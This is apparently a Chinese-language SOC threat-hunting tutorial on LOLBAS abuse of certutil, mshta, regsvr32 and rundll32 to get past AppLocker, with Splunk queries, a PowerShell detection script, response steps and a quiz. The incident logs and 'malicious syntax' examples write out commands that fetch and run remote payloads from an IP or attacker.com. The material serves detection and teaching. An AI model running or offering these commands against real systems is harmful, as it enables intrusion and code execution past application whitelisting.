## 🚨 案發現場破題 (Incident Scenario & Mental Workflow)

### 1.1 案情境況：靜默繞過 AppLocker 的微軟數位簽章進程
某高科技半導體企業的 SOC 監控大屏平靜無波。該企業在所有員工工作站上透過 AppLocker 與 Windows Defender Application Control (WDAC) 實施了嚴格的「應用程式白名單策略」：**僅允許執行帶有微軟有效數位簽章 (Microsoft Authenticode) 的二進位程式，禁止任何未授權的外部 EXE 落地運行**。

然而，當值威脅獵捕專家（Threat Hunter）在對全網 Sysmon 日誌進行例行 TTPs 假設性獵捕（Hypothesis-based Hunting）時，敏銳地在巨量進程遙測中發現了一條看似正常的日誌：
```text
UtcTime: 2026-09-14 02:15:30.120
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil.exe -urlcache -split -f http://185.220.101.5/beacon.png C:\Users\Public\update.vbs
User: CORP\jerry_chen
ParentImage: C:\Windows\System32\cmd.exe
```

隨後不到 5 秒，系統緊接著觸發：
```text
Image: C:\Windows\System32\mshta.exe
CommandLine: mshta.exe javascript:a=GetObject("script:http://185.220.101.5/stage2.sct").Exec();close();
ParentImage: C:\Windows\System32\cmd.exe
```

終端防毒軟體完全沒有報毒！因為 `certutil.exe`（微軟憑證管理工具）與 `mshta.exe`（HTML 應用程式主機）皆是 **Windows 作業系統原生自帶、具備頂級合法數位簽章的系統檔案**。

黑客沒有自行上傳任何黑客工具或未簽章木馬，而是巧妙利用了作業系統自帶的合法二進位檔作為代理執行載體——這正是資安攻防中最棘手、最隱蔽的 **合法程式白利用 (LOLBAS - Living Off The Land Binaries and Scripts)**！

```
[ 攻擊者指令下發 (Initial Execution) ]
                     │
         ┌───────────┴───────────┐
         ▼                       ▼
[ 典型黑客工具 (Mimikatz.exe) ]    [ LOLBAS 白利用 (certutil.exe / mshta.exe) ]
         │                               │
         ▼                               ▼
[ ❌ AppLocker/AV 立即阻斷 ]       [ ✅ 合法微軟簽章，放行通行！ ]
                                         │

            [ Ingress Tool Transfer ]         [ Proxy Script Execution ]
            certutil -urlcache -split         mshta vbscript/javascript
            (將載荷偽裝為 .png 下載)          (記憶體直接執行，無檔案落地)
```

## 🧩 第一動：底層機制/協定解剖 (Mechanics & LOLBAS Execution Flow)

### 2.1 為什麼 LOLBAS 能徹底擊穿防毒與白名單 (AppLocker Bypass Mechanics)
AppLocker 與 WDAC 的核心校驗邏輯通常基於三大原則：
1. **路徑原則 (Path Rules)**：允許 `C:\Windows\*` 與 `C:\Program Files\*` 執行。
2. **發行者原則 (Publisher Rules)**：允許 `O=Microsoft Corporation, L=Redmond, S=Washington, C=US` 簽署之程式執行。
3. **雜湊原則 (Hash Rules)**：特定安全雜湊白名單。

LOLBAS 程式（如 `regsvr32.exe`）同時滿足**「位在 `C:\Windows\System32\`」**且**「具備微軟官方 Authenticode 簽章」**兩大條件。攻擊者並非修改這些檔案，而是透過傳入**「未預期但官方支援的語法參數」**，迫使合法程式代為執行任意攻擊邏輯。

### 2.2 四大經典 LOLBAS 武器庫之底層機制逆推

#### 1. CertUtil.exe (憑證工具淪為下載器)
- **原始功能**：管理本機與網域 Active Directory 憑證服務 (AD CS)。
- **濫用機制**：其內建的 `-urlcache` 參數原本用於向 CRL (憑證撤銷清單) 伺服器同步快取；配合 `-split -f` 參數，`certutil` 會以 HTTP/HTTPS GET 請求將遠端檔案下載並拆分快取至本地磁碟。
- **惡意特徵語法**：
  ```cmd
  certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Users\Public\p.exe
  ```

#### 2. Mshta.exe (HTML 應用程式主機淪為無檔案代碼執行器)
- **原始功能**：微軟自 Windows 98 引入的 `.hta` (HTML Application) 執行引擎，擁有完整的 Trident (IE) 核心與系統存取權限。
- **濫用機制**：`mshta.exe` 支援在命令列直接以 Protocol Handler 協議解析 `javascript:` 或 `vbscript:` 偽協議，繞過磁碟寫入，直接在進程記憶體中實例化 COM 物件並執行 Shellcode！
- **惡意特徵語法**：
  ```cmd
  mshta.exe javascript:a=GetObject("script:http://attacker.com/payload.sct").Exec();close();
  ```

#### 3. Regsvr32.exe (Squiblydoo 攻擊技術 - T1218.010)
- **原始功能**：向 Windows 登錄檔註冊或註銷 OLE 控制項與 DLL 模組。
- **濫用機制**：Casey Smith 發現的著名 Squiblydoo 漏洞。利用 `/u /n /s /i:<URL> scrobj.dll` 組合：
  - `/u`：取消註冊（不污染登錄檔）。
  - `/n`：不呼叫 `DllRegisterServer`。
  - `/s`：無訊息靜默模式。
  - `/i:<URL>`：指定遠端 Script Component (`.sct` XML 檔案)。
  - `scrobj.dll`：微軟自帶腳本運行時，自動下載遠端 SCT 檔案並執行內嵌之 JScript/VBScript！
- **惡意特徵語法**：
  ```cmd
  regsvr32.exe /u /n /s /i:http://attacker.com/payload.sct scrobj.dll
  ```

#### 4. Rundll32.exe (動態連結庫代理執行器)
- **原始功能**：從 DLL 模組中呼叫特定導出函數（Exported Functions）。
- **濫用機制**：攻擊者可利用其執行非典型擴展名的 DLL（如 `.png`, `.txt`），或呼叫包含代碼執行的官方模組（如 `advpack.dll`, `ieadvpack.dll`）。
- **惡意特徵語法**：
  ```cmd
  rundll32.exe C:\Users\Public\payload.png,DllMain
  ```

## 🧭 第二動：解碼意圖——異常特徵速查表

| LOLBAS 二進位檔 | 惡意利用特徵參數 (True Positive) | 正常系統業務場景 (False Positive) | 鑑識獵捕優先級 |
| :--- | :--- | :--- | :--- |
| **certutil.exe** | 包含 `-urlcache`, `-split`, `-decode`, `-decodehex` 且連向公網 IP 或未信任網域。 | 不帶 URL 參數，僅執行 `certutil -dump`、`certutil -verify` 等本地憑證庫檢核。 | 🔴 **極高 (Critical)** |
| **mshta.exe** | 命令列包含 `http://`, `https://`, `javascript:`, `vbscript:`, `about:<script>`。 | 僅執行本機合規軟體安裝目錄下的 `.hta` 介面檔（如某些老舊 ERP 安裝精靈）。 | 🔴 **極高 (Critical)** |
| **regsvr32.exe** | 帶有 `/i:http`, `/i:https` 或呼叫 `scrobj.dll`，且命令列帶有 `/s /u` 靜默參數。 | 由軟體安裝檔衍生，註冊位於 `C:\Program Files` 內具備合法簽名的 `.dll` / `.ocx`。 | 🔴 **極高 (Critical)** |
| **rundll32.exe** | 載入非 `.dll` 擴展名（如 `.tmp`, `.dat`, `.png`）或自 `%TEMP%` / `%APPDATA%` 載入模組。 | 載入標準 Windows 控制台模組（如 `shell32.dll,Control_RunDLL desk.cpl`）。 | 🟡 **高 (High)** |
| **bitsadmin.exe** | 帶有 `/transfer`, `/create`, `/addfile`, `/resume` 自互聯網下載可執行二進位檔。 | 企業正式軟體更新程序背景排程傳輸（通常具備固定 Job 命名與公司網域）。 | 🟡 **高 (High)** |
| **wmic.exe** | 包含 `process call create` 呼叫外部指令，或自 `http://` 下載 XSL 樣板執行。 | 監控軟體定時查詢硬體資訊（如 `wmic cpu get name`、`wmic bios get serialnumber`）。 | 🟡 **高 (High)** |

## 💻 第三動：現場追兇——作戰指令與腳本庫

### 3.1 Sysmon 與 Splunk SPL 全網獵捕指令庫

#### 1. Splunk 聚合獵捕：全網掃描 CertUtil 惡意下載行為
```spl
index=sysmon EventCode=1 (Image="*\\certutil.exe" OR OriginalFileName="CertUtil.exe")
| eval is_download = if(match(CommandLine, "(?i)-(urlcache|split|f)"), 1, 0)
| eval is_decode = if(match(CommandLine, "(?i)-(decode|decodehex)"), 1, 0)
| where is_download=1 OR is_decode=1
| stats count min(_time) as first_seen max(_time) as last_seen 
        values(CommandLine) as commands values(User) as users 
        by host, ParentImage, Image
| table host, first_seen, last_seen, ParentImage, Image, users, commands, count
```

#### 2. Splunk 聚合獵捕：全網掃描 Mshta 與 Regsvr32 無檔案腳本代理執行
```spl
index=sysmon EventCode=1 
(Image="*\\mshta.exe" AND CommandLine="*script*") OR
(Image="*\\regsvr32.exe" AND (CommandLine="*/i:http*" OR CommandLine="*scrobj.dll*"))
| rex field=CommandLine "(?i)(?<c2_url>https?://[^\s\"']+)"
| stats count by _time, host, User, ParentImage, Image, c2_url, CommandLine
| sort - _time
```

### 3.2 PowerShell 本機即時威脅獵捕腳本 (`hunt_lolbas.ps1`)
在未部署 SIEM 的端點或應急響應現場，可直接執行以下 PowerShell 獵捕腳本，深度掃描 Windows 事件日誌中的 LOLBAS 痕跡：

```powershell
# hunt_lolbas.ps1 - Fast Local LOLBAS Incident Response Script
Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host "[*] 正在掃描本機 Event ID 1 (Sysmon) 與 Event ID 4688 (稽核進程)..." -ForegroundColor Cyan
Write-Host "=================================================================" -ForegroundColor Cyan

$lolbasRules = @(
    @{ Name = "CertUtil Download"; Pattern = "certutil.*-(urlcache|split)" },
    @{ Name = "Mshta Script Execution"; Pattern = "mshta.*(javascript|vbscript|http)" },
    @{ Name = "Regsvr32 Squiblydoo"; Pattern = "regsvr32.*/i:http.*scrobj" },
    @{ Name = "Bitsadmin Transfer"; Pattern = "bitsadmin.*/transfer" },
    @{ Name = "WMIC Process Create"; Pattern = "wmic.*process.*call.*create" }
)

$events = Get-WinEvent -FilterHashtable @{
    LogName = @("Microsoft-Windows-Sysmon/Operational", "Security")
    Id = @(1, 4688)
} -MaxEvents 5000 -ErrorAction SilentlyContinue

$results = @()

foreach ($event in $events) {
    $xml = [xml]$event.ToXml()
    $cmd = ""
    $image = ""
    $parent = ""
    $user = ""

    if ($event.Id -eq 1) {
        $cmd = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "CommandLine" }).'#text'
        $image = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "Image" }).'#text'
        $parent = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "ParentImage" }).'#text'
        $user = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "User" }).'#text'
    } else {
        $cmd = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "CommandLine" }).'#text'
        $image = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "NewProcessName" }).'#text'
        $parent = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "ParentProcessName" }).'#text'
        $user = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "SubjectUserName" }).'#text'
    }

    if ($cmd) {
        foreach ($rule in $lolbasRules) {
            if ($cmd -match $rule.Pattern) {
                $results += [PSCustomObject]@{
                    Time = $event.TimeCreated
                    RuleName = $rule.Name
                    User = $user
                    Image = $image
                    Parent = $parent
                    CommandLine = $cmd
                }
            }
        }
    }
}

if ($results.Count -gt 0) {
    Write-Host "[!] 警告：發現 $($results.Count) 筆高可疑 LOLBAS 命中記錄！" -ForegroundColor Red
    $results | Format-Table -AutoSize -Wrap
} else {
    Write-Host "[+] 檢測完成：未發現明顯 LOLBAS 濫用跡象。" -ForegroundColor Green
}
```

## ⚖️ 第四動：研判分水嶺——真實威脅 vs 業務誤報

### 4.1 SOC 研判對決 8 問 (SOC 8 Critical Questions)

| 編號 | 檢驗提問 (Verification Questions) | 是 (Yes) 判定導向 | 否 (No) 判定導向 |
| :---: | :--- | :--- | :--- |
| **Q1** | `certutil`、`mshta` 或 `regsvr32` 的父進程是否為 Office 套件、郵件軟體或瀏覽器？ | 典型釣魚附件宏或漏洞利用衍生 (T1204.002) | 偏向使用者手動輸入或系統批次腳本 |
| **Q2** | 命令列中的 URL 目的地是否為未知公網 IP、動態域名或短網址？ | 確定存在外部 C2 或惡意 Payload 拉取 (T1105) | 企業受管之內部 FQDN 或微軟官方更新 CDN |
| **Q3** | 該連線隨後是否在磁碟產生可執行檔（如 `%TEMP%\*.exe`, `C:\Users\Public\*.vbs`）？ | 確定為惡意 Dropper / Stager 落地行為 | 未落地檔案或僅產出純文字記錄檔 |
| **Q4** | 執行該命令的使用者帳號是否為一般終端使用者，而非網管或 Domain Admin 帳號？ | 異常高危：一般使用者日常工作絕不需執行此類命令 | 需確認是否為 IT 維運團隊之例行腳本 |
| **Q5** | 該 LOLBAS 呼叫是否在凌晨、週末或非工作時間集中大量爆發？ | 高危：攻擊者利用值班空檔實施自動化橫向 | 正常上班時間，偏向即時業務需求 |
| **Q6** | `regsvr32.exe` 是否加載了遠端腳本元件 `scrobj.dll`（Squiblydoo 特徵）？ | 100% 確定為繞過 AppLocker 的無檔案攻擊手法 | 正規本機 DLL 模組登錄操作 |
| **Q7** | EDR 是否在同一主機上隨後記錄到隱蔽進程注入（Sysmon Event 8 / CreateRemoteThread）？ | 確定載荷已注入核心進程（如 explorer.exe） | 尚未執行二階段注入或已被主機防護攔截 |
| **Q8** | 該命令列是否包含多重混淆（如隨機大小寫 `cErTuTiL`、插入引號 `c"e"rtutil`、Base64）？ | 意圖規避命令列字符串檢測的防禦規避特徵 | 語法標準工整，符合官方語法規範 |

## 🛡️ 第五動：處置圍堵與系統加固 SOP

### 5.1 應急處置階段 (Immediate Triage & Containment)

#### 1. 殺死惡意進程樹並拔除外聯
若確定為正在進行中的 LOLBAS 攻擊：
```powershell
# 步驟 1：依據 PID 終止 LOLBAS 進程及其子進程樹
Stop-Process -Id 4892 -Force -ErrorAction SilentlyContinue

# 步驟 2：利用防火牆或 EDR 隔離受害端點，微創封鎖 C2 下載來源
# 阻止其他同網段工作站從該惡意 IP 拉取二階段載荷
```

#### 2. 清理暫存快取與落地載荷
`certutil` 下載的檔案不僅會儲存於目標路徑，更會殘留於系統快取中：
```cmd
:: 步驟 1：強制清理 certutil 殘留的本機 URL 快取 (極其重要！)
certutil.exe -urlcache * delete

:: 步驟 2：刪除釋放於 Public 或 Temp 之惡意檔案
del /F /Q "C:\Users\Public\*.vbs"
del /F /Q "C:\Users\Public\*.dll"
del /F /Q "%TEMP%\*.exe"
```

### 5.2 長期架構加固 (Long-term Hardening)
1. **實施微軟官方推薦的 WDAC / AppLocker 推薦阻斷規則 (Microsoft Recommended Block Rules)**：
   - 封鎖特定具備代碼執行能力的高危二進位檔（如 `mshta.exe`, `wmic.exe`, `cscript.exe`）。
   - 對於必須使用的二進位檔（如 `certutil.exe`），設定軟體限制原則禁止一般非特權使用者執行。
2. **啟用端點攻擊表面減少規則 (ASR Rules)**：
   - `Block executable files from running unless they meet a prevalence, age, or trusted list criterion`
   - `Block process creations originating from PSExec and WMI commands`
3. **部署 PowerShell 限制語言模式 (Constrained Language Mode - CLM)**：防止 LOLBAS 呼叫 PowerShell 進行反射加載或直接存取 Win32 API。

### 6.1 實驗環境架設：模擬 LOLBAS 攻擊鏈
本實驗將在受控的測試環境中，以批次檔模擬攻擊者利用 `certutil` 與 `mshta` 實施的二階段白利用攻擊。

```bash
# 步驟 1：在 Linux 分析端啟動一個微型 HTTP 伺服器模擬 C2 下載點
mkdir -p /tmp/c2_server && cd /tmp/c2_server
echo "WScript.Echo(\"Pwned via LOLBAS!\");" > test_payload.sct
python3 -m http.server 8000 &
SERVER_PID=$!
```

```cmd
:: 步驟 2：在 Windows 測試靶機上執行 LOLBAS 模擬指令 (受限環境測試)

:: 模擬使用 mshta 執行無檔案腳本

```

## 📋 過關驗收檢查點 (Mastery Checklist)

- [ ] **Q1：為什麼企業明明開啟了 AppLocker「只允許執行具備 Microsoft Authenticode 數位簽章的程式」，攻擊者依然能執行惡意代碼？**  
  *考核核心*：AppLocker 預設信任微軟簽章與 `C:\Windows` 路徑下的原生程式。LOLBAS 程式（如 `certutil`, `mshta`, `regsvr32`）本身具備微軟官方簽名且合法存在於系統目錄中，因此 AppLocker 會無條件放行。攻擊者是將惡意代碼作為「參數」或「輸入資料」傳遞給合法程式執行，而非直接執行未簽章的惡意 EXE。

- [ ] **Q2：使用 `certutil.exe -urlcache -split -f` 下載檔案時，除了目標下載目錄外，系統還會在何處留下容易被 SOC 忽略的磁碟鐵證？**  
  *考核核心*：CertUtil 的底層是利用 WinINet / Crypt32 模組，其下載的檔案會自動在 Windows 網際網路快取目錄留下殘留：`%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content` 與 `Metadata`。鑑識人員即使發現黑客刪除了下載目錄的木馬，仍可在 Cryptnet 快取中提取出原始未被竄改的 Payload。

- [ ] **Q3：在微軟推行的 Squiblydoo 攻擊技術中，`regsvr32.exe /u /n /s /i:URL scrobj.dll` 為什麼一定要指定 `scrobj.dll`？**  
  *考核核心*：`scrobj.dll` 是 Windows 內建的「Script Component Runtime (腳本元件運行時)」。Regsvr32 本身只負責動態加載 DLL 並調用其導出接口，當指定 `scrobj.dll` 並搭配 `/i:URL` 時，Regsvr32 會將 URL 作為參數傳給 `scrobj.dll` 的 `DllInstall` 函數，由 `scrobj.dll` 負責自網路拉取該 SCT 檔案並執行內嵌的 JScript/VBScript，從而達成遠端代碼執行。

- [ ] **Q4：在撰寫 Splunk / SIEM 偵測規則時，為什麼單純比對 `Image="*\\certutil.exe"` 容易被黑客輕易繞過？**  
  *考核核心*：攻擊者可以將 `certutil.exe` 複製至其他目錄並更名為 `notepad.exe` 或 `update.exe`，此時基於 `Image` 檔名的檢測將徹底失效。防守方必須同時檢驗 PE 標頭中的 `OriginalFileName="CertUtil.exe"`（Sysmon Event ID 1 支援記錄原生檔案名），並搭配檢驗命令列特徵（如 `-urlcache`、`-decode`）。

- [ ] **Q5：發現內部主機被攻擊者利用 `certutil` 下載了惡意檔案，應急響應處置時為何必須執行 `certutil -urlcache * delete`？**  
  *考核核心*：若未執行清理，CertUtil 會在登錄檔與本地磁碟持續維護該惡意 URL 的索引與內容快取。在某些持久化或連線重試情境下，惡意腳本若再度調用該指令，系統會直接命中快取而不再對外發起網路連線，使邊界 IDS/防火牆失去告警能力；執行清理可徹底抹除該本機快取指標。
